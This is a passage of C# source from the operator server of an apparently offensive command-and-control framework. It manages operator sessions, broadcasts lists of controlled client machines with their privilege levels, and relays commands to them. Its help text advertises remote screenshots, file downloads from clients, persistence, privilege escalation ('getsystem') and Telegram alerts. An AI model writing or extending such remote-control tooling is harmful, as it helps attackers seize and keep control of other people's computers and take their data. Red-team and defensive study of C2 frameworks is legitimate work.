                    Type = OperatorMessageType.Notification,
                    From = "SERVER",
                    Data = $"Connected operators: {operators.Count}",
                    Payload = operators
                });

                await SendToOperator(operator_, new OperatorMessage
                {
                    Type = OperatorMessageType.Response,
                    From = "SERVER",
                    Data = $"Welcome {operator_.Username}! Use 'list' to see clients, 'connect <id>' to control a client."
                });
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error sending initial data: {ex.Message}", Color.Red);
            }
        }

        private async Task<bool> SendToOperator(ConnectedOperator operator_, OperatorMessage message)
        {
            if (operator_?.ActiveStream == null || !operator_.IsAlive)
                return false;

            try
            {
                await operator_.WriteLock.WaitAsync(5000);

                try
                {
                    string messageJson = JsonSerializer.Serialize(message);
                    byte[] messageData = Encoding.UTF8.GetBytes(messageJson + "\n");

                    await operator_.ActiveStream.WriteAsync(messageData, 0, messageData.Length);
                    await operator_.ActiveStream.FlushAsync();

                    operator_.LastActivity = DateTime.Now;
                    return true;
                }
                finally
                {
                    operator_.WriteLock.Release();
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error sending to operator {operator_?.Username}: {ex.Message}", Color.Red);
                operator_.IsAlive = false;
                return false;
            }
        }

        private async Task<bool> SendToOperatorImmediately(ConnectedOperator operator_, OperatorMessage message)
        {
            if (operator_?.ActiveStream == null || !operator_.IsAlive)
                return false;

            try
            {
                if (await operator_.WriteLock.WaitAsync(100))
                {
                    try
                    {
                        string messageJson = JsonSerializer.Serialize(message);
                        byte[] messageData = Encoding.UTF8.GetBytes(messageJson + "\n");

                        await operator_.ActiveStream.WriteAsync(messageData, 0, messageData.Length);
                        await operator_.ActiveStream.FlushAsync();

                        operator_.LastActivity = DateTime.Now;
                        return true;
                    }
                    finally
                    {
                        operator_.WriteLock.Release();
                    }
                }
                else
                {
                    return false;
                }
            }
            catch (Exception ex)
            {
                operator_.IsAlive = false;
                return false;
            }
        }

        public void BroadcastToOperators(OperatorMessage message, string excludeOperatorId = null)
        {
            if (!_operatorServerRunning) return;

            var sendTasks = new List<Task>();

            foreach (var op in _connectedOperators.Values)
            {
                if (op.OperatorId != excludeOperatorId && op.IsAuthenticated && op.IsAlive)
                {
                    sendTasks.Add(Task.Run(async () =>
                    {
                        try
                        {
                            await SendToOperator(op, message);
                        }
                        catch (Exception ex)
                        {
                            RaiseOutputMessage($"[!] Error broadcasting to {op.Username}: {ex.Message}", Color.Red);
                        }
                    }));
                }
            }

            if (sendTasks.Count > 0)
            {
                Task.Run(async () =>
                {
                    try
                    {
                        await Task.WhenAll(sendTasks).WaitAsync(TimeSpan.FromSeconds(10));
                    }
                    catch (TimeoutException)
                    {
                        RaiseOutputMessage("[!] Broadcast timeout - some operators may not have received the message", Color.Yellow);
                    }
                    catch (Exception ex)
                    {
                        RaiseOutputMessage($"[!] Broadcast error: {ex.Message}", Color.Red);
                    }
                });
            }
        }

        public void BroadcastClientUpdate(string clientId, string action)
        {
            if (!_operatorServerRunning) return;

            BroadcastToOperators(new OperatorMessage
            {
                Type = OperatorMessageType.ClientUpdate,
                From = "SERVER",
                ClientId = clientId,
                Data = action
            });
        }

        public void BroadcastUpdatedClientList()
        {
            if (!_operatorServerRunning) return;

            try
            {
                var clients = _server.GetClients().Where(c => c.IsConnected)
                                         .Select(c => FormatClientDataForOperators(c))
                                         .ToList();

                BroadcastToOperators(new OperatorMessage
                {
                    Type = OperatorMessageType.ClientList,
                    From = "SERVER",
                    Data = JsonSerializer.Serialize(clients)
                });
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error broadcasting client list: {ex.Message}", Color.Red);
            }
        }

        public void BroadcastOperatorListUpdate()
        {
            if (!_operatorServerRunning) return;

            try
            {
                RaiseOperatorListChanged();
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error broadcasting operator list update: {ex.Message}", Color.Red);
            }
        }

        public void BroadcastServerCommand(string command, string clientId)
        {
            if (!_operatorServerRunning) return;

            BroadcastToOperators(new OperatorMessage
            {
                Type = OperatorMessageType.Command,
                From = "SERVER",
                ClientId = clientId,
                Data = command,
                ColorHint = "#0080FF"
            });
        }

        public void BroadcastCommandResponseToOperators(string clientId, string response)
        {
            if (!_operatorServerRunning || _connectedOperators.Count == 0) return;

            if (string.IsNullOrWhiteSpace(response) || response.StartsWith("[DEBUG]")) return;

            BroadcastToOperators(new OperatorMessage
            {
                Type = OperatorMessageType.Response,
                From = "SERVER",
                ClientId = clientId,
                Data = response
            });
        }

        private object FormatClientDataForOperators(ClientHandler client)
        {
            string formattedUserName = client.UserName;

            if (string.IsNullOrEmpty(formattedUserName) || formattedUserName == "Unknown")
            {
                formattedUserName = "Unknown";
            }
            else
            {
                if (formattedUserName.Contains("NT AUTHORITY\\SYSTEM", StringComparison.OrdinalIgnoreCase))
                {
                    formattedUserName = "NT AUTHORITY\\SYSTEM";
                }
                else
                {
                    bool isDomainUser = client.IsDomainJoined;

                    if (client.IsAdmin && !formattedUserName.Contains("(Administrator)"))
                    {
                        formattedUserName = $"{formattedUserName} (Administrator)";
                    }

                    if (!formattedUserName.Contains("(Local User)") && !formattedUserName.Contains("(Domain User)"))
                    {
                        if (isDomainUser)
                        {
                            formattedUserName = $"{formattedUserName} (Domain User)";
                        }
                        else if (!formattedUserName.Contains("SYSTEM"))
                        {
                            formattedUserName = $"{formattedUserName} (Local User)";
                        }
                    }
                }
            }

            return new
            {
                client.ClientId,
                client.ClientInfo,
                UserName = formattedUserName,
                client.ComputerName,
                client.IsAdmin,
                client.OSVersion,
                client.IsConnected,
                client.IsEncrypted,
                client.LastSeen,
                client.IsLinux,
                client.ShellType,
                client.IsDomainJoined
            };
        }

        private string GetOperatorHelpText()
        {
            return @"=== C2 Framework Operator Commands ===

Server Management:
  connect <id>    - Connect to specific client session
  disconnect      - Disconnect from current client
  list/beacons    - List all active clients
  help            - Show this help

C2 Framework Commands (Operator role):
  screenshot      - Take screenshot (Windows only)
  download <file> - Download file from client ✅ ENABLED FOR OPERATORS
  persist         - Show persistence options
  cleanup_persist - Clean up persistence (Linux only)
  telegram_config - Configure Telegram notifications
  telegram_on/off - Enable/disable notifications
  telegram_test   - Test Telegram notification
  telegram_status - Show Telegram status

Client Shell Commands (Operator role):
  whoami          - Get current user
  hostname        - Get computer name
  pwd/cd          - Current/change directory
  dir/ls          - List directory
  systeminfo      - System information
  ipconfig        - Network configuration
  ps/tasklist     - Process list

GUI Features (Operator role):
  File Explorer   - ✅ ENABLED - Right-click client and select File Explorer
  
=== Role Information ===
⚡ OPERATOR: Access to commands, download, and file explorer
👁️ OBSERVER: View-only access (list, beacons, help only)

Note: 
- Use 'connect <id>' first to select a client
- ❌ upload/getsystem require direct server access (blocked for operators)
- ✅ download/file explorer now available for operators
- Downloads will be saved on the server, not your local machine
- Observer role cannot connect to sessions or execute commands";
        }

        private void CheckOperatorHeartbeat(object state)
        {
            if (!_operatorServerRunning) return;

            var now = DateTime.Now;
            var toRemove = new List<string>();

            foreach (var op in _connectedOperators.Values)
            {
                if (now - op.LastActivity > TimeSpan.FromMinutes(15))
                {
                    toRemove.Add(op.OperatorId);
                    op.IsAlive = false;
                    RaiseOutputMessage($"[!] Operator {op.Username} timed out (15min idle)", Color.Red);
                }
                else if (now - op.LastActivity > TimeSpan.FromMinutes(10))
                {
                    Task.Run(async () =>
                    {
                        try
                        {
                            await SendToOperator(op, new OperatorMessage
                            {
                                Type = OperatorMessageType.HeartBeat,
                                From = "SERVER",
                                Data = "PING_KEEP_ALIVE"
                            });
                        }
                        catch (Exception ex)
                        {
                            RaiseOutputMessage($"[!] Failed to send keepalive to {op.Username}: {ex.Message}", Color.Yellow);
                        }
                    });
                }
            }

            foreach (var id in toRemove)
            {
                if (_connectedOperators.TryRemove(id, out var op))
                {
                    try
                    {
                        op.Connection?.Close();
                        op.SslStream?.Dispose();
                    }
                    catch { }
                    RaiseOutputMessage($"[*] Operator {op.Username} disconnected", Color.Yellow);
                }
            }

            if (toRemove.Count > 0)
            {
                BroadcastOperatorListUpdate();
            }
        }

        private void UpdateUserLoginStats(string username)
        {
            try
            {
                var config = OperatorConfigManager.GetConfig();
                var user = config.Operators.FirstOrDefault(u => u.Username == username);

                if (user != null)
                {
                    user.LastLogin = DateTime.Now;
                    user.LoginCount++;
                    OperatorConfigManager.SaveConfig();
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error updating login stats: {ex.Message}", Color.Red);
            }
        }

        public bool IsMultiplayerEnabled() => _operatorConfig?.MultiplayerEnabled ?? false;
        public int GetConnectedOperatorCount() => _connectedOperators.Count;
        public IEnumerable<ConnectedOperator> GetConnectedOperators() => _connectedOperators.Values;
        public bool IsOperatorServerRunning => _operatorServerRunning;

        public bool IsUserCurrentlyConnected(string username)
        {
            return _connectedOperators.Values.Any(op =>
                op.Username == username &&
                op.IsAuthenticated &&
                op.IsAlive);
        }

        public void ForceDisconnectUser(string username, string reason = "Forced disconnect by administrator")
        {
            var operatorsToDisconnect = _connectedOperators.Values
                .Where(op => op.Username == username && op.IsAuthenticated)
                .ToList();

            foreach (var operator_ in operatorsToDisconnect)
            {
                try
                {
                    Task.Run(async () =>
                    {
                        await SendToOperator(operator_, new OperatorMessage
                        {
                            Type = OperatorMessageType.Notification,
                            From = "SERVER",
                            Data = reason
                        });

                        await Task.Delay(1000);
                        operator_.Connection?.Close();
                    });
                }
                catch (Exception ex)
                {
                    RaiseOutputMessage($"[!] Error disconnecting user {username}: {ex.Message}", Color.Red);
                }
            }

            RaiseOutputMessage($"[*] Force disconnected user '{username}': {reason}", Color.Yellow);
        }

        private void RaiseOutputMessage(string message, Color color)
        {
            OutputMessage?.Invoke(this, new OutputMessageEventArgs(message, color));
        }

        private void RaiseOperatorListChanged()
        {
            OperatorListChanged?.Invoke(this, EventArgs.Empty);
        }

        public void Dispose()
        {
            _heartbeatTimer?.Dispose();
            StopOperatorServer();
        }
    }
}